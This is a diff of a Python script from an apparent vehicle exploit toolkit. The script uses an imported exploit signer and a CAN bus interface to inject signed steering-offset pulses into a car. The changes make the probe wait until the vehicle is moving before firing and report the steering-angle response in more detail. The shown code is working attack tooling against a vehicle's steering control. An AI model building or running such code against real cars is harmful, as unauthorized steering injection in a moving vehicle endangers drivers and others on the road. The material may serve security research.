@@ -25,9 +25,9 @@ ROOT = Path(__file__).resolve().parents[4]
 sys.path.insert(0, str(ROOT))
 
 from exploit.ephemeral_runtime import crown_f30_b6_inline_signer as signer
-from tools.targets.crown.live.crown_f30_resident_soak import u32_delta
 
-BASELINE_SECONDS = 0.350
+BASELINE_MIN_SECONDS = 0.350
+BASELINE_TIMEOUT_SECONDS = 2.500
 PULSE_DURATION_SECONDS = 0.250
 RATE_HZ = 50.0
 POST_OBSERVE_SECONDS = 0.750
@@ -37,6 +37,10 @@ DIRECTIONAL_RESPONSE_DEG = 0.20
 
 class AuthorityProbeError(RuntimeError):
     pass
+
+
+def u32_delta(after: int, before: int) -> int:
+    return (int(after) - int(before)) & 0xFFFFFFFF
 
 
 def offset_target(*, start_deg: float, offset_deg: float) -> tuple[int, float]:
@@ -55,6 +59,38 @@ def directional_delta(*, start_deg: float, offset_deg: float, angles: list[float
     if offset_deg > 0:
         return max(angle - start_deg for angle in angles)
     return max(start_deg - angle for angle in angles)
+
+
+def summarize_angle_windows(*, samples: list[dict[str, Any]], pulse_start_t: float, pulse_end_t: float,
+                            offset_deg: float, fallback_start_deg: float) -> dict[str, Any]:
+    angle_rows = [row for row in samples if row["kind"] == "steering_angle"]
+    baseline_rows = [row for row in angle_rows if float(row["t_seconds"]) < pulse_start_t]
+    pulse_rows = [row for row in angle_rows if pulse_start_t <= float(row["t_seconds"]) <= pulse_end_t]
+    post_rows = [row for row in angle_rows if float(row["t_seconds"]) > pulse_end_t]
+    all_values = [float(row["angle_deg"]) for row in angle_rows]
+    baseline_values = [float(row["angle_deg"]) for row in baseline_rows]
+    pulse_values = [float(row["angle_deg"]) for row in pulse_rows]
+    post_values = [float(row["angle_deg"]) for row in post_rows]
+    reference = float(baseline_rows[-1]["angle_deg"]) if baseline_rows else fallback_start_deg
+    pulse_directional = directional_delta(start_deg=reference, offset_deg=offset_deg, angles=pulse_values)
+    pulse_end_angle = pulse_values[-1] if pulse_values else None
+    pulse_end_directional = (
+        (pulse_end_angle - reference) if offset_deg > 0 else (reference - pulse_end_angle)
+    ) if pulse_end_angle is not None else None
+    post_continuation = (
+        directional_delta(start_deg=pulse_end_angle, offset_deg=offset_deg, angles=post_values)
+        if pulse_end_angle is not None else None
+    )
+    return {
+        "angle_rows": angle_rows,
+        "all_values": all_values,
+        "baseline_span_deg": (max(baseline_values) - min(baseline_values)) if baseline_values else None,
+        "pulse_reference_deg": reference,
+        "pulse_window_directional_delta_deg": pulse_directional,
+        "pulse_end_directional_delta_deg": pulse_end_directional,
+        "post_pulse_continuation_deg": post_continuation,
+        "pulse_window_directional_motion_observed": pulse_directional >= DIRECTIONAL_RESPONSE_DEG,
+    }
 
 
 def collect_vehicle_samples(panda: Any, *, origin: float, samples: list[dict[str, Any]]) -> None:
@@ -99,10 +135,22 @@ def latest_kind(samples: list[dict[str, Any]], kind: str) -> dict[str, Any] | No
 
 
 def moving_baseline(panda: Any, *, origin: float, samples: list[dict[str, Any]]) -> dict[str, Any]:
-    deadline = time.monotonic() + BASELINE_SECONDS
+    started = time.monotonic()
+    minimum_end = started + BASELINE_MIN_SECONDS
+    deadline = started + BASELINE_TIMEOUT_SECONDS
     while time.monotonic() < deadline:
         collect_vehicle_samples(panda, origin=origin, samples=samples)
+        ready = latest_kind(samples, "ready")
+        wheel = latest_kind(samples, "wheel_speed")
+        angle = latest_kind(samples, "steering_angle")
+        moving = (
+            wheel is not None
+            and max(abs(int(value)) for value in wheel["centered_raw"]) > signer.CROWN_STATIONARY_RAW_TOLERANCE
+        )
+        if time.monotonic() >= minimum_end and ready is not None and ready["ready"] == 1 and moving and angle is not None:
+            return {"ready": ready, "wheel_speed": wheel, "steering_angle": angle}
         time.sleep(0.001)
+
     ready = latest_kind(samples, "ready")
     wheel = latest_kind(samples, "wheel_speed")
     angle = latest_kind(samples, "steering_angle")
@@ -112,12 +160,10 @@ def moving_baseline(panda: Any, *, origin: float, samples: list[dict[str, Any]])
         raise AuthorityProbeError("moving authority probe did not observe bus1 0x0AA")
     if angle is None:
         raise AuthorityProbeError("moving authority probe did not observe bus1 0x025")
-    if max(abs(int(value)) for value in wheel["centered_raw"]) <= signer.CROWN_STATIONARY_RAW_TOLERANCE:
-        raise AuthorityProbeError(
-            "moving authority probe requires non-stationary wheel-speed evidence; "
-            f"centered_raw={wheel['centered_raw']}"
-        )
-    return {"ready": ready, "wheel_speed": wheel, "steering_angle": angle}
+    raise AuthorityProbeError(
+        "moving authority probe requires non-stationary wheel-speed evidence; "
+        f"centered_raw={wheel['centered_raw']}"
+    )
 
 
 def run(*, payload: Path, helper: Path, meta: Path, offset_deg: float) -> dict[str, Any]:
@@ -186,9 +232,15 @@ def run(*, payload: Path, helper: Path, meta: Path, offset_deg: float) -> dict[s
     signed_delta = u32_delta(state_after["signed_count"], state_before["signed_count"])
     attempt_delta = u32_delta(telemetry_after["command5_attempts"], telemetry_before["command5_attempts"])
 
-    angle_rows = [row for row in samples if row["kind"] == "steering_angle"]
-    angle_values = [float(row["angle_deg"]) for row in angle_rows]
-    requested_direction_delta = directional_delta(start_deg=start_deg, offset_deg=offset_deg, angles=angle_values)
+    pulse_end = pulse_start + PULSE_DURATION_SECONDS
+    pulse_start_t = pulse_start - origin
+    pulse_end_t = pulse_end - origin
+    angle_summary = summarize_angle_windows(
+        samples=samples, pulse_start_t=pulse_start_t, pulse_end_t=pulse_end_t,
+        offset_deg=offset_deg, fallback_start_deg=start_deg,
+    )
+    angle_rows = angle_summary["angle_rows"]
+    angle_values = angle_summary["all_values"]
     final_ready = latest_kind(samples, "ready")
     final_wheel = latest_kind(samples, "wheel_speed")
     clean_signing = (
@@ -200,8 +252,6 @@ def run(*, payload: Path, helper: Path, meta: Path, offset_deg: float) -> dict[s
         and telemetry_after["last_command_status"] == 0
         and final_ready is not None and final_ready["ready"] == 1
     )
-    directional_response = requested_direction_delta >= DIRECTIONAL_RESPONSE_DEG
-
     return {
         "schema": "crown-f30-b6-moving-authority-pulse-v1",
         "target": bundle.meta["target"],
@@ -230,16 +280,19 @@ def run(*, payload: Path, helper: Path, meta: Path, offset_deg: float) -> dict[s
         "steering_angle_sample_count": len(angle_rows),
         "angle_min_deg": min(angle_values) if angle_values else None,
         "angle_max_deg": max(angle_values) if angle_values else None,
-        "requested_direction_delta_deg": requested_direction_delta,
-        "directional_response_observed": directional_response,
-        "verdict": (
-            "signed_offset_pulse_directional_response_observed" if clean_signing and directional_response
-            else "signed_offset_pulse_delivered_no_clear_directional_response" if clean_signing
-            else "authority_pulse_signing_not_clean"
-        ),
+        "pulse_start_t_seconds": pulse_start_t,
+        "pulse_end_t_seconds": pulse_end_t,
+        "baseline_angle_span_deg": angle_summary["baseline_span_deg"],
+        "pulse_reference_angle_deg": angle_summary["pulse_reference_deg"],
+        "pulse_window_directional_delta_deg": angle_summary["pulse_window_directional_delta_deg"],
+        "pulse_end_directional_delta_deg": angle_summary["pulse_end_directional_delta_deg"],
+        "post_pulse_continuation_deg": angle_summary["post_pulse_continuation_deg"],
+        "pulse_window_directional_motion_observed": angle_summary["pulse_window_directional_motion_observed"],
+        "verdict": "signed_offset_pulse_delivered" if clean_signing else "authority_pulse_signing_not_clean",
+        "authority_interpretation": "unqualified_driver_and_road_dynamics_not_removed",
         "interpretation_boundary": (
-            "directional 0x025 response is evidence consistent with authority but road/driver dynamics are not independently removed; "
-            "absence of response does not identify the minimum-speed/state gate"
+            "pulse-window 0x025 motion is reported separately from baseline and post-pulse motion; road/driver dynamics are not "
+            "independently removed, so this probe alone does not prove or disprove physical authority or identify a minimum-speed/state gate"
         ),
         "persistent_flash_writes": False,
         "resident_bytes_modified": False,
@@ -267,7 +320,8 @@ def main() -> int:
         print(json.dumps({
             "schema": "crown-f30-b6-moving-authority-pulse-plan-v1",
             "offset_deg": args.offset_deg,
-            "baseline_seconds": BASELINE_SECONDS,
+            "baseline_min_seconds": BASELINE_MIN_SECONDS,
+            "baseline_timeout_seconds": BASELINE_TIMEOUT_SECONDS,
             "pulse_duration_seconds": PULSE_DURATION_SECONDS,
             "post_observe_seconds": POST_OBSERVE_SECONDS,
             "rate_hz": RATE_HZ,
